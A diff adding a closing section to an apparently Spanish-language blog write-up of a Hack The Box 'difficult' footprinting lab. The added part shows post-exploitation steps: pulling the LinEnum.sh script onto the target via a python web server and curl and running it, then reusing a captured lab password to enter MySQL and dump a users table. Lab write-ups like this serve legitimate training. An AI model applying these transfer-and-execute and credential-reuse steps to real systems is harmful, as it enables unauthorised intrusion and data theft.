@@ -1,9 +1,9 @@
 --- 
 title: "Laboratorio de Footprinting - Díficil"  
 date: 2025-04-30  
-tags: ["HTB", "Footprinting","", ""]  
-categories: ["Footprinting","", ""]  
-summary: ""
+tags: ["HTB", "Footprinting","nmap", "snmp", "ssh", "mysql"]  
+categories: ["HTB", "Footprinting"]  
+summary: "En este laboratorio de **footprinting** de nivel difícil, analizamos un servidor MX expuesto en la red interna. Mediante técnicas de enumeración activa sobre servicios como **IMAPS**, **SNMP** y **MySQL**, descubrimos credenciales sensibles que nos permitieron acceder por **SSH** y escalar privilegios a través de la explotación de servicios locales."
 draft: false 
 
 ---
@@ -90,3 +90,66 @@ Ahora vamos a utilizar la clave para acceder:
 ssh -i id_rsa tom@<IP>
 ```
 
+Vale ya dentro vamos a proceder  a pasar un script de reconocimiento de Linux donde nos va a mostrar información del equipo y con ella intentar escalar privilegios.
+
+Primero nos descargamos el script LinEnum.sh a local con el comando 
+```bash
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
+```
+
+Luego en la carpeta donde nos descargamos el script montamos un servidor web para transferirlo a la máquina víctima.
+```python
+python3 -m http.server 8000
+```
+
+Ahora en la máquina víctima hacemos un curl al servidor web de la siguiente forma:
+```bash
+curl http://<IP>:8000/LinEnum.sh -o script.sh
+```
+Recordar la IP es la de la interfaz de Hack the Box.
+
+Luego en la máquina víctima le damos permisos de ejecución al script
+```bash
+chmod +x script.sh
+```
+
+Y lo ejecutamos
+```bash
+./script.sh
+```
+Mostrando lo siguiente:
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil12.png)
+Y vemos esto que tenemos con el usuario tom cierto privilegio con el servicio mysql.
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil13.png)
+Vemos si está corriendo el servicio y sí está corriendo.
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil14.png)
+Vemos donde está ubicado para llamarlo y ejecutarlo:
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil15.png)
+Ejecutamos el comando:
+```bash
+#/usr/bin/mysql Este da error porque debemos especificar la contraseña.
+
+/usr/bin/mysql -p #Ponemos a continuación el password del usuario tom 'NMds732Js2761'
+```
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil16.png)Y podemos acceder a mysql
+```mysql
+show databases;
+```
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil17.png)
+Seleccionamos la base de datos users:
+```mysql
+use users;
+```
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil18.png)
+Vemos su contendido  y nos damos cuenta que hay muchos usuarios en dicha tabla:
+```mysql
+select * from users;
+```
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil19.png)
+Y con la siguiente query encontramos el usuario deseado
+```mysql
+select * from users where username = 'HTB';
+```
+![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil20.png)
+
+Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.
